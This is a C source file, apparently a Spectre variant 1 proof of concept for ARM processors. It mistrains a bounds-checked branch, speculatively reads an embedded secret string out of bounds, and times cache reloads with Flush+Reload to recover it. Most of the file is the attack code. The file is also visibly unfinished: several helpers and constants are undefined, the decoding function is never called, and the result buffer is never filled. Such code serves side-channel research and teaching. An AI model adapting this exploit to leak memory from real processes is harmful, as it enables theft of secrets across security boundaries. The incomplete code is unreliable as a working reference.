#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <string.h>
#include <ctype.h>

#include "timer.h"
#include <stddef.h>
#include <sched.h>

#define PAGE_SIZE 16384
#define CACHE_LINE_SIZE 128
#define SYMBOL_CNT (1 << (sizeof(char) * 8))

// ====== The evil attacker code ======
#define REP 400 // Number of repetitions to de-noise the channel // 400 works for BYPASS_VICTIM_TEST 1
#define TRAINING_EPOCH 64 // 15 in-bound accesses then 1 out-of-bound access
#define BUF_SIZE 20

uint64_t threshold;
// ====== Below is a common Spectre "PoC" ======
uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
volatile size_t array_size = 8;

// The secret information
const char *secret = "The cake is a lie!";




// Find the most hit cacheline and safely decode its character
void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
    size_t limit = (cnt < SYMBOL_CNT) ? cnt : SYMBOL_CNT;

    // 1) best (prefer smaller index on ties)
    uint64_t best_hits = 0;
    size_t best_idx = 0;
    for (size_t i = 0; i < limit; ++i) {
        if (hits[i] > best_hits) {
            best_hits = hits[i];
            best_idx = i;
        }
    }

    // 2) strict runner-up
    uint64_t scd_hits = 0;
    size_t scd_idx = 0;
    for (size_t i = 0; i < limit; ++i) {
        if (i == best_idx) continue;
        if (hits[i] > scd_hits && hits[i] < best_hits) {
            scd_hits = hits[i];
            scd_idx = i;
        }
    }

    unsigned char best = (unsigned char)best_idx;
    unsigned char scd  = (unsigned char)scd_idx;

    *c = isprint(best) ? best : '?';
    char scd_c = (scd_hits > 0 && isprint(scd)) ? scd : '?';

    printf("Best guess: '%c' (ASCII=0x%02x, #hits=%" PRIu64 "); ",
           *c, (unsigned)best, best_hits);
    if (scd_hits > 0) {
        printf("2nd best guess: '%c' (ASCII=0x%02x, #hits=%" PRIu64 ")\n",
               scd_c, (unsigned)scd, scd_hits);
    } else {
        printf("2nd best guess: <none>\n");
    }
}


float compute(float idx) {
    float result;
    static const float mulc = 119356.86523904f;
    static const float divc = 2.18f;

    asm volatile(
        // Step 1: Load multiplier from memory (dependency chain starts)
        "ldr    s2, %[mulptr]              \n\t" // load multiplier
        "fmul   %s[result], %s[idx], s2    \n\t" // result = idx * mulc

        // Step 2: Set up dependency chain using repeated reloads
        "mov    x4, %[divptr]              \n\t" // base address of divc

        // 15 chained divisions, each reloading divc and depending on previous
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"
        "ldr    s3, [x4]                   \n\t"
        "fdiv   %s[result], %s[result], s3 \n\t"

        : [result] "=w"(result)
        : [idx] "w"(idx),
          [mulptr] "m"(mulc),
          [divptr] "r"(&divc)
        : "s2", "s3", "x4"
    );

    return result;
}


__attribute__((noinline))
int naive_victim(uint8_t *pages, size_t idx, size_t stride) {
    int time1 = timer_now();
    int time2;
    if (idx < array_size) {
        int result = pages[array[idx] * stride];
        time2 = timer_now();
        printf("Branch Taken: %d\n", time2-time1);
        return  result;
    }
    time2 = timer_now();
    printf("Branch Not Taken: %d\n", time2-time1);
    return 0;
}


void naive_attacker() {

    printf("-----------------------------------------\n");
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[BUF_SIZE] = { '\0' };

    // Pages for Flush+Reload
    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return;
    }
    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
    size_t stride = PAGE_SIZE;

    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array;
    printf("Secret address: %p, Array address: %p\n", secret, array);
    printf("The malicious index is %p-%p=%#lx\n", secret, array,
           malicious_index);
    printf("-----------------------------------------\n");


    /* SAVE THIS CODE SEGMENT FOR ENTIRE CACHE WIPES */
    // Sweep through the eviction buffer with cache-line stride to evict target from caches.
    size_t evict_bytes = (size_t)BUF_SIZE_MB * 1024 * 1024;
    uint8_t *evict_buf = malloc(evict_bytes + LINE_SIZE);
    if (!evict_buf) { 
        perror("malloc evict_buf"); 
        exit(-1); 
    }
    // touch pages to allocate physical memory
    for (size_t i = 0; i < evict_bytes; i += 4096) evict_buf[i] = 1;
    /* END SAVE HERE */


    // Set to 1 to bypass speculation and directly touch the secret’s page.
// Set to 0 to use the normal speculative victim path.
#ifndef BYPASS_VICTIM_TEST
#define BYPASS_VICTIM_TEST 0
#endif

for (size_t c = 0; c < strlen(secret); c++) {

    for (size_t r = 0; r < REP; r++) {
        // -------- SPECULATIVE victim path (your original training/attack) --------
        for (size_t t = 0; t < TRAINING_EPOCH; t++) {
            bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
            size_t index = csel(malicious_index + c, 0, is_attack);
            
        
            // Evict BEFORE victim (soft "flush"), and keep bounds value cold
            evict_by_sweep(evict_buf, evict_bytes);
            __asm__ __volatile__("dsb ish" ::: "memory");
            ISB();

            // Run victim; make result observable to block DCE
            int leak = naive_victim((uint8_t *)pages, index, stride);
            __asm__ __volatile__("" :: "r"(leak) : "memory");
            

        }


        // -------- Measurement: reload timings (no eviction/touches before this) --------
        for (size_t i = 0; i < SYMBOL_CNT; i++) {
            size_t idx = (i * 167 + 13) % SYMBOL_CNT;
            uint8_t *ptr = pages + (stride * idx);
            hits[idx] += (timer_time_maccess(ptr) < threshold);
        }
    }


    memset(hits, 0, sizeof(hits));
    }

    printf("Recovered secret: \"%s\"\n", buf);
    munmap(pages, PAGE_SIZE * SYMBOL_CNT);




    

    return;
}

int main(){

    // Initialize our timer
    if(timer_init(true, 1) != 0){
        perror("timer_init");
        exit(-1);
    }
    printf("-----------------------------------------\n");
    threshold = calibrate_latency();
    // this is how I can force secret-array to be positive malicious index


    naive_attacker();



    



    return 0;
}